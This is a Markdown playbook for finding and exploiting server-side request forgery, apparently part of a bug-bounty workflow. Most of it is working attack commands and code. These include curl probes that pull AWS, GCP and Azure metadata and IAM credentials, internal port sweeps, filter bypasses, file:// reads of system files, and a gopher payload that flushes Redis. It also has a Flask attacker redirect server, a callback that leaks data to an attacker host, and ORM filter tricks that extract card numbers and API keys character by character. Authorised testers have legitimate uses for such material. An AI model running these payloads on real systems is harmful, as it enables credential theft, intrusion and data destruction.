# Playbook: SSRF Testing

## Purpose
Detect and exploit Server-Side Request Forgery across all input vectors.
Covers blind SSRF, semi-blind, and full-read SSRF scenarios.
Input: endpoint with URL/IP/hostname parameter, or parameter list.

---

## Step 1 — Setup OOB Callback Infrastructure

Before testing, set up an out-of-band (OOB) listener to detect blind SSRF:

```bash
# Option A — Interactsh (preferred, no server needed)
interactsh-client -v   # generates unique OAST URL like abc123.oast.fun

# Option B — Burp Collaborator (if you have Pro)
# Use the Collaborator tab in Burp Suite

# Option C — manual ngrok + netcat
ngrok http 8888 &
nc -lvnp 8888

# Option D — requestbin / webhook.site (online, free)
# https://webhook.site → get unique URL

CALLBACK_URL="abc123.oast.fun"   # Replace with your OOB domain
```

---

## Step 2 — Identify SSRF Entry Points

```bash
# From parameter_discovery output
cat params_ssrf.txt   # Already categorized: url, src, endpoint, proxy, fetch...

# From wayback output — find existing URL-type params
grep -iE "[?&](url|uri|src|href|link|endpoint|host|proxy|fetch|load|import|resource|feed|webhook|callback|service|backend|server|api|remote|dest|goto|open|redir)=" \
  urls_all.txt | sort -u > ssrf_candidates.txt

# Other high-value vectors to check manually:
# - PDF/image generators (often fetch external URLs)
# - Import features (CSV from URL, RSS feed reader)
# - Webhooks with custom URL field
# - Preview/thumbnail generators
# - "Add integration" / "Connect service" features
# - XML processors (XXE → SSRF)
# - File download from URL features
```

---

## Step 3 — Basic SSRF Probes

For each candidate parameter:

```bash
ENDPOINT="https://TARGET/api/fetch"
PARAM="url"

# Probe 1 — OOB detection (blind SSRF)
curl -sk "${ENDPOINT}?${PARAM}=http://${CALLBACK_URL}/ssrf-test"

# Probe 2 — Internal metadata service
# AWS
curl -sk "${ENDPOINT}?${PARAM}=http://169.254.169.254/latest/meta-data/"
curl -sk "${ENDPOINT}?${PARAM}=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# GCP
curl -sk "${ENDPOINT}?${PARAM}=http://metadata.google.internal/computeMetadata/v1/" \
  # Note: GCP requires header: -H "Metadata-Flavor: Google"
curl -sk "${ENDPOINT}?${PARAM}=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure
curl -sk "${ENDPOINT}?${PARAM}=http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Probe 3 — Localhost services
for port in 80 443 8080 8443 8888 3000 4000 5000 6379 9200 27017 3306 5432; do
  curl -sk "${ENDPOINT}?${PARAM}=http://127.0.0.1:${port}/"
  curl -sk "${ENDPOINT}?${PARAM}=http://localhost:${port}/"
done

# Probe 4 — Internal network ranges
for ip in 10.0.0.1 10.1.1.1 172.16.0.1 192.168.1.1; do
  curl -sk "${ENDPOINT}?${PARAM}=http://${ip}/"
done
```

---

## Step 4 — SSRF Bypass Techniques

If basic probes are blocked, try these bypasses:

```bash
# IP encoding bypasses for 127.0.0.1
BYPASSES=(
  "http://127.0.0.1/"
  "http://0x7f000001/"          # hex
  "http://2130706433/"          # decimal
  "http://0177.0.0.01/"        # octal
  "http://127.1/"               # short form
  "http://[::1]/"               # IPv6 localhost
  "http://[::ffff:127.0.0.1]/"  # IPv6 mapped
  "http://localhost/"
  "http://localtest.me/"        # resolves to 127.0.0.1
  "http://spoofed.burpcollaborator.net/"  # DNS rebinding
)

for bypass in "${BYPASSES[@]}"; do
  echo -n "Testing $bypass : "
  curl -sk -o /dev/null -w "%{http_code}" "${ENDPOINT}?${PARAM}=${bypass}"
  echo
done

# URL scheme bypasses
SCHEMES=(
  "file:///etc/passwd"
  "file:///etc/hosts"
  "file:///proc/self/environ"
  "dict://127.0.0.1:6379/info"   # Redis
  "gopher://127.0.0.1:6379/_*1%0d%0a%245%0d%0aFLUSH%0d%0a"  # Redis gopher
  "sftp://CALLBACK_URL/"
  "tftp://CALLBACK_URL/test"
  "ldap://CALLBACK_URL/"
)

for scheme in "${SCHEMES[@]}"; do
  curl -sk "${ENDPOINT}?${PARAM}=${scheme}"
done

# DNS rebinding (advanced)
# Use: https://lock.cmpxchg8b.com/rebinder.html
# Point domain to 127.0.0.1 with low TTL

# Open redirect chain → SSRF
# If target trusts its own domain for URL param:
curl -sk "${ENDPOINT}?${PARAM}=https://TARGET/redirect?next=http://169.254.169.254/"

# URL parsing confusion
curl -sk "${ENDPOINT}?${PARAM}=http://trusted.com@169.254.169.254/"
curl -sk "${ENDPOINT}?${PARAM}=http://169.254.169.254#trusted.com"
curl -sk "${ENDPOINT}?${PARAM}=http://169.254.169.254?.trusted.com"
```

---

## Step 5 — AWS/Cloud Metadata Exploitation

If SSRF reaches cloud metadata:

```bash
# AWS — most impactful path
BASE="${ENDPOINT}?${PARAM}=http://169.254.169.254/latest/meta-data"

# Get IAM role name
curl -sk "${BASE}/iam/security-credentials/"
# Then get credentials for that role
ROLE=$(curl -sk "${BASE}/iam/security-credentials/" | tr -d '\n')
curl -sk "${BASE}/iam/security-credentials/${ROLE}"
# Returns: AccessKeyId, SecretAccessKey, Token

# Get instance info
curl -sk "${BASE}/instance-id"
curl -sk "${BASE}/public-ipv4"
curl -sk "${BASE}/hostname"
curl -sk "http://169.254.169.254/latest/user-data"  # Often has secrets/scripts

# IMDSv2 (token required — most modern AWS uses this)
TOKEN=$(curl -sk -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -sk -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

---

## Step 6 — Internal Service Fingerprinting

If SSRF can reach internal hosts:

```bash
# Fingerprint internal services by response size/content
for port in 22 80 443 2375 2376 3000 3306 4040 4243 5000 5432 6379 \
            7001 8080 8161 8443 8500 8600 9000 9200 9300 27017 50070; do
  length=$(curl -sk -o /dev/null -w "%{size_download}" \
    "${ENDPOINT}?${PARAM}=http://127.0.0.1:${port}/")
  [ "$length" -gt "0" ] && echo "[OPEN] port $port — response size: $length"
done

# Identify service from response
curl -sk "${ENDPOINT}?${PARAM}=http://127.0.0.1:6379/" | strings | head -20
# Redis → -ERR wrong number of arguments
# Elasticsearch → {"name":"...","cluster_name":...}
# Consul → {"Config":...}
# Kubernetes API → {"kind":"Status"...}
```

---

## Step 7 — Blind SSRF via HTTP Redirect Loops (PortSwigger Top 10 2025 #3)

Technique by Shubs (@infosec_au): turning blind SSRF into visible SSRF through
controlled redirect chains that leak information about internal service responses.

### Concept

In a blind SSRF scenario the attacker cannot see the response body. By forcing the
vulnerable server to follow a redirect chain that bounces between an attacker-controlled
server and the target internal service, each hop can encode information about the
internal response (status code, headers, timing, response size) into observable
side channels.

### How It Works

1. The vulnerable application follows HTTP redirects.
2. The attacker server responds with a `302` redirect pointing to the internal target.
3. The internal target responds (e.g., `200 OK` with some body).
4. If the application follows further redirects embedded in the internal response,
   or if the attacker controls the next hop, the chain continues.
5. At each hop the attacker server logs the request, including timing deltas,
   `Referer` headers, and any query parameters that leak state.

### Practical Setup — Attacker Redirect Server

```python
# redirect_loop_server.py — minimal Flask server for redirect-loop SSRF probing
from flask import Flask, redirect, request
import time, json

app = Flask(__name__)
log = []

@app.route("/start")
def start():
    """Initial entry — redirect to the internal target."""
    target = request.args.get("target", "http://127.0.0.1:80/")
    log.append({"step": "start", "target": target, "time": time.time()})
    return redirect(target, code=302)

@app.route("/bounce")
def bounce():
    """Intermediate bounce — log what we learn, redirect again."""
    step = request.args.get("step", "0")
    port = int(request.args.get("port", "80")) + 1
    log.append({
        "step": step,
        "referer": request.headers.get("Referer", ""),
        "time": time.time(),
        "headers": dict(request.headers),
    })
    # Probe next port in the chain
    next_target = f"http://127.0.0.1:{port}/"
    return redirect(next_target, code=302)

@app.route("/log")
def show_log():
    return json.dumps(log, indent=2)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8888)
```

### Extracting Information

| Side Channel       | What It Reveals                                   |
|--------------------|---------------------------------------------------|
| Timing delta       | Whether the internal port is open (fast RST vs slow timeout) |
| Response size      | Content-Length differences indicate distinct services |
| Status code        | Some libraries pass upstream status through redirects |
| Referer header     | May contain fragments of the internal URL or path  |
| Redirect depth     | Max-redirect errors reveal how many hops succeeded |

### Testing Commands

```bash
# Step 1 — Start the redirect loop server on your VPS
python3 redirect_loop_server.py &

# Step 2 — Trigger SSRF through the vulnerable parameter
ATTACKER="http://YOUR_VPS:8888"
curl -sk "${ENDPOINT}?${PARAM}=${ATTACKER}/start?target=http://169.254.169.254/latest/meta-data/"

# Step 3 — Check logged data
curl -sk "${ATTACKER}/log" | jq .

# Step 4 — Incremental port scan via redirect chain
for port in 80 443 3000 5000 6379 8080 9200; do
  curl -sk "${ENDPOINT}?${PARAM}=${ATTACKER}/start?target=http://127.0.0.1:${port}/"
  sleep 0.5
done
curl -sk "${ATTACKER}/log" | jq '.[] | {step, time}'
# Compare timing deltas — open ports respond faster than closed/filtered ones
```

### Combining with DNS Rebinding

DNS rebinding pairs well with redirect loops to bypass IP-based SSRF filters:

1. Configure a rebinding domain (e.g., via `rbndr.us` or `rebinder`) so the first
   DNS resolution returns the attacker IP and the second returns `127.0.0.1`.
2. The application resolves the domain, passes the allowlist check (attacker IP).
3. When the redirect triggers a second resolution, it now points to `127.0.0.1`.
4. The redirect loop continues against localhost, with each bounce leaking data
   back to the attacker server.

```bash
# Using rbndr.us: first resolution = attacker IP, second = 127.0.0.1
REBIND_DOMAIN="7f000001.YOUR_VPS_HEX.rbndr.us"
curl -sk "${ENDPOINT}?${PARAM}=http://${REBIND_DOMAIN}:8888/start?target=http://127.0.0.1:6379/"
```

### Use Cases

- **Extracting response sizes**: redirect chain encodes Content-Length into timing or path.
- **Status code enumeration**: identify which internal paths return 200 vs 403 vs 404.
- **Partial content extraction**: if the library appends response fragments to redirect
  URLs (rare but documented), the attacker log captures them.
- **Internal port scanning**: timing-based open/closed/filtered classification.

---

## Step 8 — ORM-Based SSRF and Data Leaking (PortSwigger Top 10 2025 #2)

ORM-based SSRF exploits search, filter, and relational query features in Object-Relational
Mappers. Instead of injecting URLs, the attacker manipulates ORM query parameters to
traverse object relations and access data outside the intended scope. This can also
chain into SSRF when ORM models reference external resources (e.g., avatar URLs,
webhook endpoints) that the server fetches during serialization.

### The Core Technique

Most ORMs support nested field filtering via dot notation or bracket syntax. If the
API exposes a generic filter mechanism without restricting traversable relations,
an attacker can walk the object graph to reach sensitive fields.

### Practical Examples by ORM

#### Django ORM (Python)

```
# Normal request — filter users by name
GET /api/users?filter[name]=john

# Exploit — traverse relation to org, then to billing
GET /api/users?filter[organization__billing__credit_card__number__startswith]=4
# Boolean response (result count) leaks credit card digits one by one

# Traverse to related webhook URL (may trigger SSRF on serialization)
GET /api/users?filter[organization__webhook_config__url__startswith]=http://internal
```

#### Hibernate / Spring Data JPA (Java)

```
# Normal — filter orders by status
GET /api/orders?status=pending

# Exploit — traverse to user, then to admin role
GET /api/orders?user.role.name=ADMIN
# Returns orders belonging to admin users — IDOR via ORM relation

# If the ORM eagerly fetches related entities with URL fields:
GET /api/orders?user.avatarUrl=http://ATTACKER_SERVER/leak
# Server-side fetch of the avatarUrl during serialization = SSRF
```

#### ActiveRecord (Ruby on Rails)

```ruby
# Vulnerable controller code
User.where(params[:filter])

# Exploit — nested relation traversal
GET /users?filter[organization][api_keys][key_starts_with]=sk_live_
# Leaks API key prefixes through filtered result counts

# Rails .includes() eager loading can trigger SSRF if models
# have callbacks (after_find, after_initialize) that fetch URLs
```

#### Sequelize (Node.js)

```
# Normal
GET /api/products?category=electronics

# Exploit — Sequelize nested includes
GET /api/products?include[]=supplier&include[supplier][include][]=internalConfig

# If internalConfig has a "healthcheck_url" field and the serializer
# triggers a fetch, this becomes SSRF via ORM relation walking
```

### Detection Methodology

```bash
# Step 1 — Identify filter/search endpoints
grep -iE "(filter|search|query|where|find|sort|order|include|expand|fields|embed)" \
  urls_all.txt | sort -u > orm_candidates.txt

# Step 2 — Test dot-notation and bracket-notation traversal
ENDPOINT="https://TARGET/api/users"

# Dot notation
curl -sk "${ENDPOINT}?sort=organization.name"
curl -sk "${ENDPOINT}?filter=role.permissions.name"

# Bracket notation
curl -sk "${ENDPOINT}?filter[role][name]=admin"
curl -sk "${ENDPOINT}?include[]=role&include[role][include][]=permissions"

# Step 3 — Boolean extraction via filtered counts
# If the API returns result counts, extract sensitive field values character by character
for char in a b c d e f 0 1 2 3 4 5 6 7 8 9; do
  count=$(curl -sk "${ENDPOINT}?filter[organization__api_key__startswith]=${char}" \
    | jq '.meta.total // .count // (.results | length)')
  [ "$count" -gt "0" ] && echo "[HIT] api_key starts with: ${char} (count: ${count})"
done

# Step 4 — Check if related URL fields trigger server-side fetch
curl -sk "${ENDPOINT}?include[]=webhookConfig" \
  -H "Accept: application/json" &
# Monitor OOB callback for incoming request from the server
```

### Indicators of Vulnerability

- API accepts arbitrary field names in filter/sort/include parameters.
- Error messages reveal ORM model names or relation paths
  (e.g., `Cannot resolve attribute "billing" on model "Organization"`).
- Changing relation depth in queries produces different response times.
- GraphQL APIs with deeply nested query support are especially prone to this.

### Impact

- **Data leakage**: access fields across model boundaries (API keys, tokens, PII).
- **SSRF via serialization**: ORM eagerly loads a related model with a URL field;
  the serializer or a model callback fetches that URL server-side.
- **Privilege escalation**: filter by admin role relations to access admin-only data.
- **Boolean oracle**: extract secret values character by character using
  startswith/contains filters and observing result counts.

---

## Output

```
ENDPOINT      : POST /api/v1/preview
PARAMETER     : ?url= (body: {"url": "..."})
PROBE TYPE    : AWS metadata
RESULT        : SSRF CONFIRMED — returns AWS metadata
                IMDSv1 accessible (no token required)
                IAM role: ec2-prod-role
                Credentials: AccessKeyId=ASIA...
SEVERITY      : CRITICAL
IMPACT        : Full AWS credential exposure → potential full cloud takeover
EVIDENCE      : [request/response pair showing metadata response]
BYPASS USED   : None required — direct access
NEXT STEP     : Load 03_reporting/report_writer.md → report immediately
```
